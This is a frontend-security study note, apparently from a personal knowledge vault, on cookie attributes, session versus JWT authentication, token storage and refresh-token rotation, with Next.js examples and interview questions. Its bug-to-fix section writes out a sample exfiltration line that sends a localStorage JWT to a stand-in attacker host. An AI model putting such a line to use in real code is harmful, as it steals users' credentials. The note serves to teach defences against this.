---
tags: [javascript, network, security, auth, cookies]
module: "20 - Network and Security"
priority: must-know
status: not-started
aliases: [JWT, HttpOnly, SameSite]
---

# Cookies and Auth Patterns

## Maturity Target

- Priority: #must-know
- Study time: 90-120 minutes
- Interview signal: you can compare session vs JWT auth honestly, explain every cookie attribute, and defend a position on "where should the token live?"
- Production signal: your auth design survives an XSS finding without every user's long-lived credential being stolen.
- Dependencies: [[20 - Network and Security/01 - HTTP Essentials for Frontend|HTTP Essentials]], [[19 - DOM and Browser APIs/05 - Browser Storage|Browser Storage]], [[20 - Network and Security/03 - CORS Correctly Explained|CORS]]

## Source Anchors

- [MDN - Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
- [RFC 6265bis - Cookies: HTTP State Management](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP - JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [web.dev - SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained)

## 1. Cookie Attributes — Each One Is a Defense

```text
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

| Attribute | Defends against | Meaning |
| --- | --- | --- |
| `HttpOnly` | XSS token theft | JavaScript cannot read this cookie (`document.cookie`, CookieStore excluded) |
| `Secure` | Network sniffing | Sent only over HTTPS |
| `SameSite=Lax` | CSRF | Sent on same-site requests + top-level GET navigations only (default in modern browsers) |
| `SameSite=Strict` | CSRF harder | Never sent cross-site — even following a link arrives logged-out |
| `SameSite=None` | — | Sent cross-site; requires `Secure`; needed for cross-site iframes/API credentials |
| `Domain` | Scope creep | Unset = host-only (best); `Domain=example.com` includes all subdomains |
| `Path`, `Max-Age`/`Expires` | — | Scope and lifetime; no Max-Age = session cookie |
| `__Host-` prefix | Subdomain planting | Enforces Secure, no Domain, Path=/ — the hardened default worth memorizing |

Two facts that anchor everything else: cookies are attached by the **browser automatically** (that's both their convenience and the entire CSRF problem), and `HttpOnly` is the **only** storage mechanism on the platform that XSS cannot read directly.

## 2. Session vs JWT — The Honest Comparison

**Server sessions**: cookie holds an opaque random id; state lives server-side (Redis/DB).

**JWT**: the token *is* the state — signed claims (`sub`, `exp`, roles) verifiable by any service holding the key; typically an access token (minutes) + refresh token (days).

| | Sessions | JWT |
| --- | --- | --- |
| Revocation | Instant — delete the record | **Hard** — valid until `exp` unless you add a denylist (…which is a session store again) |
| Per-request cost | Store lookup (fast, but a dependency) | Signature check only — no shared store |
| Horizontal scale / microservices | Needs shared store or sticky sessions | Stateless verify anywhere; the actual reason JWTs won in service architectures |
| Payload | Nothing client-readable | Claims readable by anyone holding it (**base64url ≠ encryption**) |
| Failure modes | Store outage = everyone logged out | Key leak = attacker mints tokens; `alg:none`/weak-key bugs; stale claims (revoked role lives until expiry) |

> [!tip] The senior answer is usually hybrid
> Short-lived JWT access token (5–15 min) + refresh token with **rotation** (each use issues a new one; reuse of an old one signals theft → revoke the family). You get stateless verification for 99% of requests and a revocation point at refresh time. Monoliths with one DB often don't need JWTs at all — a session row is simpler and instantly revocable.

## 3. Where Should Tokens Live? (The Interview Classic)

- **localStorage/sessionStorage**: readable by any XSS payload or compromised npm package — exfiltrate once, replay from anywhere until expiry. Also never auto-sent, so every request needs JS plumbing. Convenient; risky for anything long-lived ([[20 - Network and Security/05 - XSS|XSS]]).
- **HttpOnly cookie**: unstealable by script. Costs: CSRF surface (mitigate: `SameSite=Lax` + CSRF tokens — [[20 - Network and Security/06 - CSRF and CSP|CSRF and CSP]]), 4KB cap, auto-attached everywhere in scope.
- **In-memory (module variable/closure)**: gone on refresh; pairs well as "access token in memory, refresh token in HttpOnly cookie".

Honest caveat that earns senior points: XSS on your page can still *use* an HttpOnly cookie by issuing requests from the victim's browser while the tab is open. HttpOnly prevents *offline theft and replay* — a materially smaller blast radius, not immunity. The real defense stack is XSS prevention + CSP + short expiry + HttpOnly together.

## 4. Real Frontend Example: Bug → Fix → Tradeoff

Buggy version — the tutorial special:

```js
// login
const { token } = await apiFetch("/auth/login", { method: "POST", body: creds });
localStorage.setItem("jwt", token);            // 30-day JWT

// every request
fetch("/api/orders", { headers: { Authorization: `Bearer ${localStorage.getItem("jwt")}` } });
```

Traced failure: a marketing script (or any dependency in the bundle) gets compromised → it runs `fetch("https://evil.example/c?t=" + localStorage.getItem("jwt"))` on page load → attacker replays the token from their own machine for 30 days; logout clears *your* localStorage but the JWT stays valid server-side (no revocation). One XSS = full account takeover fleet-wide, silently.

Production-safe fix — split-token pattern:

```js
// Server sets: refresh=<rotating token>; HttpOnly; Secure; SameSite=Lax; Path=/auth
// Login response body carries a 10-minute access token — kept in memory only.
let accessToken = null;

async function apiFetch(url, init = {}) {
  if (!accessToken || isExpiringSoon(accessToken)) {
    accessToken = await refreshOnce();          // single-flight: dedupe concurrent refreshes
  }
  const res = await fetch(url, {
    ...init,
    headers: { ...init.headers, Authorization: `Bearer ${accessToken}` },
  });
  if (res.status === 401) { accessToken = null; return apiFetch(url, init); } // one retry
  return res;
}

async function refreshOnce() {
  // POST /auth/refresh — browser attaches the HttpOnly cookie itself.
  const res = await fetch("/auth/refresh", { method: "POST", credentials: "include" });
  if (!res.ok) redirectToLogin();
  return (await res.json()).accessToken;
}
```

Why this is better, mechanically: the stealable-by-JS artifact now expires in minutes; the long-lived credential is HttpOnly + path-scoped to `/auth` (not even sent on normal API calls) + rotated on every use with reuse detection. XSS impact drops from "30-day offline replay" to "abuse while the tab is open".

Tradeoffs: a refresh round-trip on first load and after idle (perceived latency — mitigate with silent refresh before expiry); the single-flight refresh mutex is genuinely fiddly (herd of 401s → one refresh, queue the rest); refresh rotation needs server-side family tracking; and multi-tab coordination (one tab refreshes, others' access tokens age) usually rides on a BroadcastChannel ([[19 - DOM and Browser APIs/05 - Browser Storage|Browser Storage]]). Auth libraries (Auth.js/NextAuth, Clerk, auth0-spa) exist because teams re-derive these bugs; in Next.js, Server Components and Route Handlers read the cookie server-side, which sidesteps most of the client plumbing ([[22 - Next.js Deep Dive/04 - Server Actions|Server Actions]]).

## 5. Reading a JWT Without Worshipping It

```js
// header.payload.signature — payload is base64url JSON, NOT encrypted:
JSON.parse(atob(token.split(".")[1]))  // { sub: "u42", exp: 1767225600, role: "admin" }
```

Rules: never put secrets/PII in claims; never trust client-decoded claims for authorization (display-only — the server must verify the signature); check `exp` client-side only as UX (preemptive refresh), not security. Historic vulnerabilities worth name-dropping: `alg: "none"` acceptance, HS256/RS256 confusion, weak HMAC keys.

## Real-World Use Cases

### Route protection in Next.js middleware

The dashboard must never flash unauthenticated content. Because the session is an HttpOnly cookie, the *server* can read what client JS can't — middleware gates the route before any HTML is sent.

```ts
// middleware.ts
import { NextResponse, type NextRequest } from "next/server";

export function middleware(req: NextRequest) {
  if (!req.cookies.get("__Host-session")) {
    const login = new URL("/login", req.url);
    login.searchParams.set("next", req.nextUrl.pathname);
    return NextResponse.redirect(login);
  }
  return NextResponse.next();
}
export const config = { matcher: ["/dashboard/:path*"] };
```

This leans on the auto-attach mechanic (section 1) in your favor: the browser sends the cookie with the *document navigation itself*, so auth is decided before render — no "check localStorage, then redirect" flicker, and no token readable by XSS payloads.

> [!warning]
> Middleware checking "cookie exists" is routing UX, not security — verify the session/signature in the data layer too; a forged cookie passes an existence check.

### OAuth callback arrives logged out under SameSite=Strict

A security review upgrades the session cookie to `SameSite=Strict`. Users returning from the identity provider (or clicking links in email) now land on the app *logged out*, then appear logged in after a refresh.

The mechanism: the arrival from `accounts.google.com` is a **cross-site navigation**, and `Strict` withholds the cookie on it — the first request renders anonymous; the next same-site request carries it. Fixes: `SameSite=Lax` (sent on top-level GET navigations — usually the right answer), or the two-cookie pattern: a `Strict` cookie guarding sensitive mutations plus a `Lax` one answering "who is this" for reads.

### Embedded checkout widget loses its session in an iframe

Your payment widget works on `pay.acme.com`, but embedded as an `<iframe>` in merchants' sites every API call returns 401 — the session cookie never arrives.

```text
Set-Cookie: widget_session=…; HttpOnly; Secure; SameSite=None; Partitioned
```

Inside a cross-site iframe every request is cross-site, so `Lax`/`Strict` cookies are never sent — `SameSite=None; Secure` is the only shape that flows, and it must be deliberate because it reopens the CSRF surface ([[20 - Network and Security/06 - CSRF and CSP|CSRF and CSP]]). Browsers phasing out third-party cookies add `Partitioned` (CHIPS): the cookie is keyed per embedding site, so the widget keeps per-merchant state without becoming a cross-site tracker.

## 6. Interview Answer

Short answer:

> Sessions store an opaque id in a cookie with state server-side — trivially revocable, but every request hits the session store. JWTs carry signed claims — any service can verify statelessly, but revocation before expiry requires a denylist, which reintroduces state. The pragmatic pattern: short-lived access token in memory plus a rotating refresh token in an HttpOnly, Secure, SameSite cookie.

Deeper answer:

> Storage decides the XSS blast radius: localStorage tokens are exfiltratable and replayable offline until expiry; HttpOnly cookies can't be read by script — an attacker is reduced to riding the open session. Cookies' auto-attach behavior is what creates CSRF, mitigated by SameSite=Lax defaults plus CSRF tokens for state changes. Attribute hygiene matters: Secure, host-only or __Host- prefix, scoped Path, and refresh-token rotation with reuse detection as the theft alarm.

## 7. Practice

1. <details><summary>Why does "logout" not actually log out a stolen 30-day JWT, and what are the three standard remedies?</summary>Logout typically deletes the *client's* copy; the JWT remains cryptographically valid until `exp` — the server keeps accepting it from the thief. Remedies: (1) short access-token lifetimes so theft windows are minutes; (2) server-side denylist/versioning checked per request (cost: state again); (3) refresh rotation with reuse detection to kill the token family on theft. Real systems combine 1+3.</details>

2. <details><summary>SPA on app.acme.com, API on api.acme.com, auth via HttpOnly cookie. List every attribute/config needed for the cookie to flow, and one reason teams give up and same-origin the API instead.</summary>Cookie: `SameSite=None; Secure; HttpOnly` and `Domain=.acme.com` (or set by api.acme.com directly). Client: `credentials: "include"` on every fetch. Server CORS: `Access-Control-Allow-Credentials: true` + explicit echoed `Access-Control-Allow-Origin` + `Vary: Origin` ([[20 - Network and Security/03 - CORS Correctly Explained|CORS]]). Teams flee to a same-origin `/api` proxy because SameSite=None also reopens CSRF surface, some browsers restrict third-party-ish cookies, and every hop of this chain is a distinct production incident.</details>

3. <details><summary>A dev "secures" checkout by reading `role` from the decoded JWT in React and hiding the admin button. Attack it.</summary>Client-side claims are display hints. Attacker: call the admin API directly (curl/devtools) with their valid token — if the server doesn't independently verify the signature *and* authorize the role per endpoint, hiding UI changed nothing. Also, editing the payload client-side breaks the signature, so the *server* would reject it — but code that decodes-without-verifying (an `atob` instead of a verify) accepts it. Authorization is a server concern, always.</details>

4. <details><summary>Design logout-everywhere for the hybrid pattern (memory access token + rotating refresh cookie), including other open tabs.</summary>Server: revoke the user's entire refresh-token family (delete rows/bump a token version); access tokens die naturally within minutes — or check version per request for instant kill. Client: clear in-memory token, `BroadcastChannel("auth").postMessage("logout")` (or a localStorage marker for the `storage` event) so other tabs drop their tokens and redirect; server clears the cookie via `Set-Cookie` with `Max-Age=0` on the logout response.</details>

## Related Notes

- [[20 - Network and Security/03 - CORS Correctly Explained|CORS Correctly Explained]]
- [[20 - Network and Security/05 - XSS|XSS]]
- [[20 - Network and Security/06 - CSRF and CSP|CSRF and CSP]]
- [[19 - DOM and Browser APIs/05 - Browser Storage|Browser Storage]]
- [[22 - Next.js Deep Dive/04 - Server Actions|Server Actions]]
- [[01 - Roadmap|Roadmap]]
